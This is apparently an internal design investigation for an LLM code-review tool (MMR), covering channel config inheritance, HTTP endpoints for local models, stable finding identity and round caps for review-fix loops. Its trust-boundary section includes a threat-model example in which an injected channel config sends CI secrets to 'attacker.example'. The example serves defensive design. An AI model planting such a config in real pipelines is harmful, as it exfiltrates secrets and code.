# MMR config UX, OSS-model support, and fix-loop bounding — design investigation

**Status:** Investigation / proposal. Read-only analysis. No code changed. No `.mmr.yaml` modified.

**Date:** 2026-05-22

**Scope:** Two related themes in `packages/mmr/`:
1. Configuration UX and OSS / local-model support (Thread 1).
2. Bounding the agent-driven `review → fix → review` loop that has been observed running 20+ rounds (Thread 2).

The goal is a concrete option matrix with a recommended path for each thread, not implementation. Each problem statement is cited to a specific file and line.

---

## 1. Verified problem statements

### Thread 1 — config UX & OSS-model support

**1.1. Parsers are hardcoded; there is no escape hatch for non-conforming output.**
`packages/mmr/src/core/parser.ts:195` defines `parsers: Record<string, Parser>` with exactly `default`, `gemini`, `doc-conformance`. `getParser()` (line 204) falls back to `default` for unknown names — so a channel that names a non-existent parser silently uses `default` rather than erroring. Adding a new parser shape requires editing source.

**1.2. Compensator hardcodes `claude -p`.**
`packages/mmr/src/core/compensator.ts:76` calls `dispatchChannel(..., { command: 'claude -p', ... })` for every compensating pass, regardless of what channels the user has configured. A user who has disabled all Anthropic CLIs still falls back to `claude -p`, which will fail with `not_installed`, and the review degrades or `needs-user-decision`s.

**1.3. `mmr config init` only auto-detects built-ins.**
`packages/mmr/src/commands/config.ts:21` iterates `BUILTIN_CHANNELS` only. Local-model CLIs (`ollama`, `lms`, `llama-cli`) or HTTP endpoints are never probed. The generated `.mmr.yaml` is a minimal stub with only `enabled: true|false` toggles (line 25) — no examples of custom channels, parsers, or wrappers.

**1.4. Channel config is verbose for the simple case.**
Every channel must redefine `auth.check`, `auth.failure_exit_codes`, `auth.recovery`, `prompt_wrapper`, `output_parser`, `stderr`, plus the `enabled` flag (`packages/mmr/src/config/schema.ts:14`). There is no concept of preset / parent-channel inheritance, so two Ollama channels (e.g. `qwen` and `deepseek`) repeat ~10 fields each.

**1.5. No first-class HTTP-endpoint channel.**
The only execution path is `spawn(cmd, args, { stdio: ['pipe', 'pipe', stderr] })` with prompt on stdin and JSON on stdout (`packages/mmr/src/core/dispatcher.ts:77-93`). To hit an OpenAI-compatible endpoint (Ollama, LM Studio, vLLM, llama-server), users must write and maintain a shell shim. There is no `kind` discriminator on the channel schema (`schema.ts:14`) — every channel is implicitly `kind: subprocess`.

**1.6. No declarative response normalization.**
The `gemini` parser unwraps a `{response: "..."}` envelope (`parser.ts:145-163`) — that is exactly the shape of normalization a user would want declaratively (e.g. "the model wraps in `choices[0].message.content`"), but it is hardcoded. A user can use `prompt_wrapper` to inject "respond with JSON only" instructions (`schema.ts:20`), but cannot specify how to extract from a known wrapper.

**1.7. No introspection / dry-run.**
`mmr config channels` prints a 4-field summary (name, enabled, command, parser) at `commands/config.ts:88-93`. There is no command that:
- Prints the **merged** channel config for one channel (`~/.mmr/config.yaml` ∪ `.mmr.yaml` ∪ defaults) so the user can see what will actually run.
- Prints the **assembled prompt** for a given diff without dispatching.
- Tests a single channel end-to-end and shows the raw output.

`mmr config test` (line 52) only runs auth checks — it never dispatches the prompt, so a misconfigured parser or wrapper is invisible until a real review fails.

### Thread 2 — fix-loop bounding

**2.1. MMR has no concept of a "round" or "session".**
Every `mmr review` invocation calls `store.createJob()` (`packages/mmr/src/commands/review.ts:193`), which generates a fresh job ID `mmr-<6 hex bytes>` (`job-store.ts:38`). There is no cross-job linkage, no parent-job reference, no fix-attempt counter, no session ID. From MMR's perspective, round 1 and round 20 are unrelated reviews of (likely) similar diffs.

**2.2. Finding identity is not stable across runs.**
The reconciler groups by `normalizeLocation(location)` which is just `.toLowerCase().trim()` (`reconciler.ts:8-10`) — no stripping of line/column spans. Then it backfills IDs by **list position** after sorting by severity: `F-${String(i + 1).padStart(3, '0')}` (`reconciler.ts:96-100`). Two consequences:
- Line numbers shift after almost any fix → `location` changes → reconciler treats it as a new finding next round.
- Even if the *same* underlying issue surfaces, its `id` changes because the position in the severity-sorted list changes.

The reconciler *preserves* any `id` set by a channel (`reconciler.ts:84`) and only backfills `F-001`-style IDs when none is present (`reconciler.ts:96-100`). In practice, however, none of the built-in parsers attaches an `id` — `validateFinding` (`parser.ts:79-93`) only carries `id` through if a channel explicitly emits one, which no CLI does today. So every reconciled run effectively gets fresh position-based IDs. There is no content-hashed identity field at all.

**2.3. Compensating passes are non-deterministic.**
`compensator.ts:65-85` dispatches `claude -p` with a focus-area preamble for every missing channel. Two consecutive runs of the same diff produce different findings because the underlying LLM is non-deterministic. When 1–2 of the 3 channels are degraded, this is the dominant source of round-to-round drift — the "consensus" agreement category in the reconciler (`reconciler.ts:55`) requires 2+ sources, and a compensating-only finding is downgraded to `confidence: 'low'` (`reconciler.ts:68-71`) but still surfaces in the verdict.

**2.4. Default `fix_threshold` is P2.**
`DEFAULT_CONFIG.defaults.fix_threshold = 'P2'` (`defaults.ts:11`). P2 is documented in the core prompt as "Improvement opportunity — style, naming, documentation, minor optimization" (`templates/core-prompt.md:6`). Asking three LLMs to find style/naming opportunities and gating on consensus there is effectively asking them to bikeshed indefinitely. P2 findings are exactly the category most prone to differ between channels and between rounds.

**2.5. The "3-round limit per finding" is agent-side only.**
`content/tools/review-pr.md:233-238` describes the per-finding 3-attempt rule, and `review-pr.md:241` notes the channel-rule. Both are instructions to the *caller* — MMR provides no enforcement, no per-finding attempt counter, no API to ask "has this finding appeared before?". Compliance depends entirely on the agent's bookkeeping, which is fragile because of 2.2 above (the agent can't reliably tell that finding `F-007` in round 5 is "the same" as `F-004` in round 2).

**2.6. No acknowledgment / suppression mechanism.**
There is no way to mark a finding "accepted as-is, do not re-surface" or "wontfix" that survives a re-run. The only persistence is `~/.mmr/jobs/<id>/results.json`, scoped to one invocation. Even `mmr jobs prune` (`README.md`) treats jobs as ephemeral.

**2.7. New fixes can introduce new low-severity findings indefinitely.**
There is no mechanism to mark a finding as a *regression of the previous fix* (caused by this round's changes) vs. a *pre-existing finding now surfaced* (latent issue exposed by reduced noise). Without that distinction, every round of fix work can legitimately surface more findings that the previous round masked.

## 2. Option matrix

Severity gate references throughout: P0 (critical) > P1 (high) > P2 (medium) > P3 (trivial), per `templates/core-prompt.md`.

Complexity scale: **S** = ≤1 day, schema-additive; **M** = 2–5 days, cross-module; **L** = ≥1 week, touches dispatch/store/reconciler.

## 3. Recommended path

### Thread 1 — recommended bundle: **T1-A + T1-B + T1-C + T1-D + T1-E + T1-F + T1-G**, deferring T1-H.

Rationale:

- **T1-A (channel inheritance)** is the highest UX-per-effort win. The dominant pain in adding a local channel today is repeating 10 fields. With `extends:`, a project ships an `ollama-base` once and inherits it per model.
- **T1-B (declarative parsers)** is the *only* viable path to plug in OSS models that emit `{"choices":[{"message":{"content":"..."}}]}`-style envelopes without forcing a shell shim. The `unwrap-jsonpath` + `then: default` chain covers ~90% of practical cases. Keep it as a **schema union** with the existing string form so all current configs validate unchanged.
- **T1-C (HTTP-endpoint channel)** is scheduled for v3.30 per §5 decision. Adds first-class support for LM Studio, vLLM, llama-server, and managed OSS endpoints (Groq, Together.ai, Anyscale, Fireworks) that expose only HTTP and have no inference CLI. Sequencing after T1-A/B means HTTP channels can reuse the `extends:` and declarative-parser machinery already shipped.
- **T1-D (init probing) + T1-E (channels show) + T1-F (dry-run)** are pure DX and small. They make the system legible — currently users can't see what they actually have configured. Without these, every other improvement is invisible.
- **T1-G (configurable compensator)** is the last step toward "I can run MMR with zero Anthropic dependencies." It defaults to today's `claude -p` so nothing changes for existing users. Combined with T1-A and T1-B, a user can fully unplug from Anthropic in `.mmr.yaml` alone.
- **T1-H (parser plugin path)** is a code-execution risk for shared/CI configs. Defer unless a concrete need surfaces.

Sequence the Thread-1 work as:
- **v3.28 ("config foundations"):** T1-A, T1-D, T1-E, T1-F. Schema-additive only; no behavior change for existing configs. Ship docs with a local-model example.
- **v3.29 ("OSS-ready"):** T1-B, T1-G. Adds two parser kinds + configurable compensator. With v3.28's `extends:`, the user-facing surface stays small.
- **v3.30 ("HTTP + loop control"):** T1-C ships alongside the Thread-2 loop-control work below.

### Thread 2 — recommended bundle: **T2-A + T2-B + T2-F + T2-D** (T2-E dropped per §5 decision), with T2-C as an opt-in follow-up, T2-G deferred, T2-H/I rejected, T2-J shipped immediately as a wrapper-side stopgap.

Rationale:

- **T2-A (stable finding identity)** is load-bearing for every other Thread-2 improvement and for the agent-side per-finding rule in CLAUDE.md. Without it, agents can't even tell when "the same finding" recurs. This is the single most impactful fix.
- **T2-B (session linkage) + T2-F (max-rounds)** together close the runaway loop. Sessions are cheap to add (just a parent pointer in `JobMetadata`). `--max-rounds` is enforced by MMR rather than relying on the agent. Per §5, when `--session` is used without `--max-rounds`, MMR enforces a default cap of **5 rounds**.
- **T2-D (sticky acknowledgments)** lets a team mark "this finding is intentional in this project" and move on. Combined with T2-A's stable keys, an ack survives line-number drift. Per §5, acks are project-scoped by default (committed under `./.mmr/acks/`), with `--scope user` opt-in for private acks under `~/.mmr/acks/`.
- **T2-E (default P1) — rejected.** Per §5, the default `fix_threshold` stays at P2 across the board (both code default and `mmr config init` template). The runaway-loop problem is addressed via T2-A/B/F/D (stable identity + sessions + max-rounds + acks) without changing the gate. Teams that find P2 too aggressive can set `fix_threshold: P1` in their own `.mmr.yaml`, and `mmr ack` covers the "this is intentional" case.
- **T2-C (auto-suppression)** is powerful but easy to over-fit. Ship it as an opt-in setting (`loop_control.repeat_downgrade_after`, default disabled); let teams turn it on once they've used the basic round cap for a release cycle.
- **T2-G (regression-vs-preexisting tagging)** is genuinely useful but L-complexity. Defer to a later release once T2-A/B/D are validated.
- **T2-H (compensator anchoring)** has a real risk of biasing the model and is hard to evaluate. Reject for now.
- **T2-I (in-MMR fix loop)** moves the loop into MMR; this conflicts with the existing wrapper architecture and `scaffold observe audit --fix`. Per §5, rejected permanently — MMR stays one-shot.
- **T2-J (wrappers-only)** is the immediate stopgap. Per §5, ship it now in `review-pr.md` / `review-code.md` so scaffold users get value before MMR v3.30. The wrapper changes are throwaway once v3.30 lands.

Sequence:
- **Stopgap (immediate, no MMR change):** T2-J — update `content/tools/review-pr.md` (lines 233-238) and `content/tools/review-code.md` to compute a wrapper-side hash that **mirrors T2-A's full identity shape as closely as the wrapper can** — concatenate normalized-location + category (when the channel emits one) + normalized-description + normalized-suggestion and sha1 the result — persist it across rounds in `.scaffold/`, and stop at 3 attempts per hash. (Hashing only `(file, normalized-description)` would conflate distinct findings in the same file and prematurely abort fixes for different real findings.) For recurrence detection across rounds, use the same location-anchored fuzzy-match rule T2-A specifies (Jaccard ≥ 0.7 on a description-shingle, anchored to identical normalized-location). Optionally suggest `--fix-threshold P1` for noisy fix loops; project default stays at P2 per §5.
- **v3.30 ("HTTP + loop control"):** T2-A, T2-B, T2-F, T2-D, plus T1-C (HTTP-endpoint channel kind) from Thread 1. Larger release; consider splitting into v3.30a (loop control) and v3.30b (HTTP) if scope or testing balloons.
- **v3.31 ("smart suppression"):** T2-C (default off).
- **Later:** T2-G if data supports it.

## 5. Decisions (resolved 2026-05-22)

1. **Ack storage location — per-project default, per-user opt-in, *with self-suppression and channel-config trust guards*.** Acks live under `./.mmr/acks/` by default (committed and shared with the team). `--scope user` writes to `~/.mmr/acks/`. At read time, both stores are consulted and merged; project acks shadow user acks on conflict.

   **Trust boundary — applies to both acks AND project channel config (`.mmr.yaml`):** when MMR is reviewing a diff (`--pr`, `--base/--head`, `--diff`, `--staged`), both project acks AND the project `.mmr.yaml` itself must be loaded from the **base ref** of the diff, not from the working tree. Two attack surfaces this closes:
   - **Ack self-suppression** — without the rule, a PR could add `.mmr/acks/<key>.json` files in the same diff that introduces the findings being acked.
   - **Secret exfiltration via HTTP channel injection (P0)** — without the rule, a PR could add a `kind: http` channel to `.mmr.yaml` with `endpoint: "https://attacker.example/log"` and `api_key_env: "ARBITRARY_CI_SECRET"`, causing the review to ship CI secrets and diff content to an attacker-controlled URL. Loading channel config from the base ref means new/modified channels in a PR only take effect *after* merge, when a human has reviewed them.

   **If the diff touches `./.mmr/acks/` or `./.mmr.yaml`,** MMR surfaces the changes as "newly proposed config/acks" in the output and the review verdict becomes `needs-user-decision` unless invoked with explicit caller opt-in: `--accept-new-acks` for ack files and `--trust-project-config` for `.mmr.yaml` (separate flags because they have different blast radii). For modes with `git diff HEAD` (uncommitted changes in a repo where HEAD is the user's committed state), HEAD is the trust base — modifications must be committed before they take effect, which preserves the boundary.

   **Untrusted-HEAD modes (the wider P0 fix).** In CI / wrapper flows that check out an untrusted PR head and then pass `--diff` against a patch file, or in any mode where there is no resolvable trusted Git base ref (`--diff` from stdin, `--diff` against a `.patch` file, the non-Git fallback below), **HEAD itself is attacker-controlled**, so the "load from HEAD" rule does not provide a trust boundary. In these modes MMR **disables project `.mmr.yaml` and project acks by default**. To opt in, the caller must either (a) provide `--config-base-ref <ref>` pointing at a trusted base from which project config and acks are loaded, or (b) pass `--trust-project-config` and/or `--trust-project-acks` explicitly accepting working-tree/HEAD values. Without either, only user-scope and built-in defaults apply.

   **Non-Git fallback.** When the working directory is not a Git repository at all (zip deployments, flat-file reviews), the untrusted-HEAD rule above applies — project config and acks are disabled unless `--trust-project-*` flags are passed. User-scope acks (`~/.mmr/acks/`) and user-scope channel config (`~/.mmr/config.yaml`) continue to work unchanged — the threat model treats user-scope config as already trusted by the user. The verdict output annotates the active trust mode (base-ref / untrusted-HEAD / non-Git) so callers know which boundary applies.

2. **Stable identity scope — exclude severity, include suggestion + category.** `finding_key = sha1(normalized_location + "|" + (category ?? "") + "|" + sha1(description_normalized) + "|" + sha1(suggestion_normalized))` (string concatenation; `"|"` is the literal pipe delimiter). Severity is excluded; `category` (when present) and `suggestion_normalized` are included alongside location and description so that two genuinely different findings in the same file don't collide just because their descriptions overlap. See T2-A in §2 for the precise definitions of `normalized_location` (strips trailing line/column spans, keeps the file path), `description_normalized` (strips line-number mentions and severity-prefix filler; **keeps backtick-quoted code snippets**), and `suggestion_normalized` (lowercase + collapse whitespace only). T2-A also defines a separate `description_shingle: string[]` field used for fuzzy Jaccard re-occurrence matching across rounds when the strict key drifts due to LLM phrasing changes. `finding_key` is a **new field on `ReconciledFinding`** distinct from the existing `id` — the latter continues to carry any channel-provided identifier and is backfilled with `F-001`-style values when absent (preserving today's `reconciler.ts:96-100` behavior so downstream `F-\d{3}` consumers don't break). Severity travels separately on the finding; the same underlying issue surfacing at P1 vs P2 across channels still reconciles to a single key — this matches today's reconciler behavior at `reconciler.ts:50`, which already takes the max severity within a location-grouped cluster.

3. **`extends:` semantics — deep merge, validate on merged result, parents may be abstract.** Deep merge of parent fields (matches `loader.deepMerge`'s existing config-layer behavior). Validation is performed on the **fully merged** channel, not the local child block: any *concrete* (non-abstract) channel must have its identifying field set after merge — `command` for `kind: subprocess` (the default), or `endpoint` for `kind: http`. A child can therefore legitimately inherit `command`/`endpoint` from its parent and override only fields that differ (e.g., `model`, `timeout`). The earlier "child must redefine" framing was too strict — `extends:` is explicit delegation by definition, so there is no "silence" to prevent. **Abstract parents** (`abstract: true` per T1-A) skip kind-discriminated validation entirely and are filtered out before dispatch; they exist only to be inherited from. Cycle detection: track the ancestor stack and reject configs with depth > 4.

4. **Default `fix_threshold` — no change.** `DEFAULT_CONFIG.defaults.fix_threshold` stays `P2` and `mmr config init` continues to write `fix_threshold: P2`. T2-E is dropped from the recommended bundle. Loop convergence is addressed via T2-A/B/F/D + ack store + the wrapper-side T2-J stopgap, without changing the gate. Teams that find P2 too aggressive set `fix_threshold: P1` in their own `.mmr.yaml`.

5. **Round-cap default — 5 rounds.** When `--session` is set without explicit `--max-rounds`, MMR enforces a cap of 5 rounds. Override via `--max-rounds N` on the CLI or `loop_control.max_rounds_default: N` in config.

6. **Wrapper-side stopgap (T2-J) — ship immediately.** Update `content/tools/review-pr.md` and `content/tools/review-code.md` with the wrapper-side description-hash + 3-strike rule before MMR v3.30 starts. The wrapper changes are throwaway once v3.30 lands. The stopgap may *suggest* `--fix-threshold P1` for noisy fix loops but does not change the project default (per decision 4).

7. **`mmr review --fix-loop` (T2-I) — permanently rejected.** MMR stays one-shot. Loop orchestration is the wrapper/agent layer's responsibility, including for non-scaffold consumers (they get the same primitives: `--session`, `--max-rounds`, stable finding keys, ack store).

8. **HTTP-endpoint channel (T1-C) — scheduled for v3.30.** Bundled with Thread-2 loop-control work. Adds `kind: http` for LM Studio, vLLM, llama-server, and managed OSS endpoints (Groq, Together.ai, Anyscale, Fireworks). Schema-additive: existing channels remain implicit `kind: subprocess`. If v3.30 scope balloons during implementation, split into v3.30a (loop control) and v3.30b (HTTP).
